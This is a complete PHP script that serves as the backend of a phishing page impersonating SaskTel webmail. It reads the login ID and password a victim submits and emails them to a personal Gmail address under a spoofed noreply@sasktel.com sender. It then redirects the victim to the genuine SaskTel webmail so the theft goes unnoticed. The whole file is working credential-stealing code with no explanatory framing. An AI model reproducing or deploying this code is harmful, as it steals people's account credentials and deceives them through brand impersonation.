<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $loginID = htmlspecialchars($_POST['loginID']);
    $password = htmlspecialchars($_POST['password']);
    
    // Email parameters
    $to = "jadenbottler@gmail.com";
    $subject = "SaskTel Email Login Details";
    $message = "Login ID: " . $loginID . "\nPassword: " . $password;
    $headers = "From: noreply@sasktel.com";
    
    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to the desired page after email is sent
        header("Location: https://webmail.sasktel.net/");
        exit();
    } else {
        echo "Failed to send email.";
    }
}
?>
